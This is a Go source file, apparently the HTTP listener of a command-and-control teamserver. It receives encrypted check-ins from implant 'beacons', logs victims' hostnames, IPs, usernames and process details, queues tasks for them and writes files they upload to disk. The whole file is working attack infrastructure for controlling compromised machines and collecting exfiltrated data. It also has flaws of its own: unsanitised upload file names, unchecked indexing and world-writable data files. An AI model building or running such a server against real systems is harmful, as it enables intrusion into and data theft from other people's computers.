package commands

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	bingo_errors "github.com/bingoc2/bingoc2-framework/teamserver/errors"
	grumble "github.com/bingoc2/bingoc2-framework/teamserver/grumble_modified"
	"github.com/bingoc2/bingoc2-framework/teamserver/hellsgopher"
	"github.com/bingoc2/bingoc2-framework/teamserver/logging"
	"github.com/bingoc2/bingoc2-framework/teamserver/management"
	"github.com/bingoc2/bingoc2-framework/teamserver/version"
	yamlstructs "github.com/bingoc2/bingoc2-framework/teamserver/yaml_structs"
	"github.com/gorilla/mux"
	"gopkg.in/yaml.v3"
)

var contextG *grumble.Context

// format for post request from beacons
type httpPostInitRequest struct {
	Hostname        string   `json:"hostname"`
	IP              string   `json:"ip"`
	Interfaces      []string `json:"interfaces"`
	ProcessPath     string   `json:"processpath"`
	PWD             string   `json:"pwd"`
	ProcessName     string   `json:"processname"`
	ProcessID       int      `json:"pid"`
	ParentProcessID int      `json:"ppid"`
	Username        string   `json:"username"`
	OperatingSystem string   `json:"os"`
	Sleep           int      `json:"sleep"`
	Jitter          int      `json:"json"`
	Listener        string   `json:"listener"`
}

type httpTaskPostRequest struct {
	Task string `json:"task"`
	Data string `json:"data"`
}

type httpTaskRequest struct {
	Tasks []string `json:"tasks"`
}

// check if tcp is available
func checkTCPPort(port string) bool {
	// attempt to listen on port
	ln, err := net.Listen("tcp", ":"+port)

	// check for error
	if err != nil {
		return false
	}

	ln.Close()
	return true
}

// check if a listener is still alive
func checkListenerIsAlive(name string, isAlive chan<- bool) {
	listenerData, _ := yamlstructs.ReadListenerYaml(name)
	isAlive <- listenerData.IsAlive
}

// entry point for starting HTTP listener.
// Called by `listen http`
func ListenHttp(c *grumble.Context) error {
	contextG = c

	// get flags
	lhost := c.Flags.String("lhost")
	lport := c.Flags.String("port")
	uri := c.Flags.String("uri")
	name := c.Flags.String("name")

	// check if port is avaiable
	if !checkTCPPort(lport) {
		return bingo_errors.ErrCmdNotSupported
	}

	// check if name is blank
	// if it's blank, assign random name
	if name == "blank" {
		name = management.GenerateName()
	}

	// check if name is unique
	if _, err := os.Stat(fmt.Sprintf(version.LISTENER_DATA_DIR+"/%s.yaml", name)); !errors.Is(err, os.ErrNotExist) {
		return bingo_errors.ErrNameInUse
	}

	// start listener
	router := mux.NewRouter()
	router.HandleFunc(fmt.Sprintf("/%s", uri), httpListenerHandler).Methods("POST")

	server := &http.Server{Addr: fmt.Sprintf("%s:%s", lhost, lport), Handler: router}

	go server.ListenAndServe()
	logging.Okay(fmt.Sprintf("started http listener (%s) on %s:%s", name, lhost, lport), c)

	// create yaml data
	var newData yamlstructs.ListenerDataYaml = yamlstructs.ListenerDataYaml{
		Channel: "http",
		Name:    name,
		LHOST:   lhost,
		LPORT:   lport,
		URI:     uri,
		IsAlive: true,
	}

	// write data to yaml file
	yamlData, err := yaml.Marshal(&newData)
	if err != nil {
		return err
	}

	err = os.WriteFile(fmt.Sprintf(version.LISTENER_DATA_DIR+"%s.yaml", name), yamlData, 0666)
	if err != nil {
		return err
	}

	// check for shutdown call
	ticker := time.NewTicker(5 * time.Second)
	aliveChan := make(chan bool, 1)
	go func() {
		for range ticker.C {
			go checkListenerIsAlive(name, aliveChan)

			if !<-aliveChan {
				newData.IsAlive = false

				server.Shutdown(context.Background())
				logging.Okay(fmt.Sprintf("shutdown listener %s", name), c)

				return
			}
		}
	}()

	return nil
}

// handler for http router
func httpListenerHandler(w http.ResponseWriter, r *http.Request) {
	// check callback type
	callType := r.Header.Get("CallType")
	agentID := r.Header.Get("AgentID")
	beaconName := r.Header.Get("Name")

	// strip .exe from beacon name
	if strings.Contains(beaconName, ".exe") {
		beaconNameSplit := strings.Split(beaconName, ".")
		beaconName = beaconNameSplit[0]
	}

	if callType == "Init" {
		fmt.Println(beaconName)
		// pull key from beacon name
		beaconData, err := yamlstructs.ReadBeaconYaml(beaconName)
		if err != nil {
			return
		}

		key := beaconData.Key
		fmt.Println(key)

		// decrypt message
		bodyBytesEncoded, err := io.ReadAll(r.Body)
		if err != nil {
			fmt.Println(err.Error())
			return
		}

		bodyStringDecoded, err := hellsgopher.DecryptString(key, string(bodyBytesEncoded))
		if err != nil {
			return
		}

		// read post request json
		var postReq httpPostInitRequest
		err = json.Unmarshal([]byte(bodyStringDecoded), &postReq)
		fmt.Println("JSON ERROR:", err)

		agentName := management.GenerateName()

		// create session data file
		// create sessions data file
		newSessionsData := yamlstructs.SessionDataYaml{
			Name:            agentName,
			BeaconName:      beaconName,
			AgentID:         agentID,
			Hostname:        postReq.Hostname,
			IP:              postReq.IP,
			Interfaces:      postReq.Interfaces,
			PWD:             postReq.PWD,
			ProcessPath:     postReq.ProcessPath,
			ProcessName:     postReq.ProcessName,
			ProcessID:       postReq.ProcessID,
			ParentProcessID: postReq.ParentProcessID,
			Username:        postReq.Username,
			OperatingSystem: postReq.OperatingSystem,
			Sleep:           postReq.Sleep,
			Jitter:          postReq.Jitter,
			Listener:        postReq.Listener,
			LastCallBack:    time.Now(),
			Tasks:           nil,
		}

		yamlData, err := yaml.Marshal(&newSessionsData)
		if err != nil {
			return
		}

		os.WriteFile(fmt.Sprintf(version.SESSION_DATA_DIR+"%s.yaml", agentID), yamlData, 0666)

		w.Write([]byte("ack check"))
		logging.Okay(fmt.Sprintf("%s(%s) callback has been received from %s", agentName, agentID, postReq.IP), contextG)
	} else if callType == "Check" {
		sleep := r.Header.Get("SLEEP")
		iSleep, _ := strconv.Atoi(sleep)

		file := version.SESSION_DATA_DIR + agentID + ".yaml"

		yfile, _ := os.ReadFile(file)

		var data yamlstructs.SessionDataYaml
		yaml.Unmarshal(yfile, &data)

		if data.AgentID == agentID {
			newSessionsData := yamlstructs.SessionDataYaml{}

			newSessionsData = yamlstructs.SessionDataYaml{
				Name:            data.Name,
				AgentID:         agentID,
				Hostname:        data.Hostname,
				IP:              data.IP,
				Interfaces:      data.Interfaces,
				PWD:             data.PWD,
				ProcessPath:     data.ProcessPath,
				ProcessName:     data.ProcessName,
				ProcessID:       data.ProcessID,
				ParentProcessID: data.ParentProcessID,
				Username:        data.Username,
				OperatingSystem: data.OperatingSystem,
				Sleep:           iSleep,
				Jitter:          data.Jitter,
				Listener:        data.Listener,
				LastCallBack:    time.Now(),
				Tasks:           nil,
			}

			yamlData, err := yaml.Marshal(&newSessionsData)
			if err != nil {
				return
			}

			os.WriteFile(file, yamlData, 0666)
		}

		// check for task
		if len(data.Tasks) != 0 {
			// marshal json data
			rawJsonData := httpTaskRequest{
				Tasks: data.Tasks,
			}

			jsonData, _ := json.Marshal(rawJsonData)

			w.Write(jsonData)
		} else {
			w.Write([]byte("ack check"))
		}

	} else if callType == "Task" {
		// decode response
		// pull key from beacon name
		beaconData, err := yamlstructs.ReadBeaconYaml(beaconName)
		if err != nil {
			return
		}

		key := beaconData.Key

		// decrypt message
		bodyBytesEncoded, err := io.ReadAll(r.Body)
		if err != nil {
			return
		}

		bodyStringDecoded, err := hellsgopher.DecryptString(key, string(bodyBytesEncoded))
		if err != nil {
			return
		}

		// read post request json
		var postReq httpTaskPostRequest
		json.Unmarshal([]byte(bodyStringDecoded), &postReq)

		dataSplit := strings.Split(postReq.Data, " //SPLIT// ")
		dataToPrint := dataSplit[0]
		dataToDown := dataSplit[1]

		// download data to file if needed
		if dataToDown != "" {
			dataToDownSplit := strings.Split(dataToDown, " //END NAME// ")
			fileName := dataToDownSplit[0]
			dataToDownload := dataToDownSplit[1]

			hellsgopher.NewFileWithContent("./files/"+fileName, dataToDownload)
		}

		// print data to screen
		contextG.App.Println(dataToPrint)
	}
}
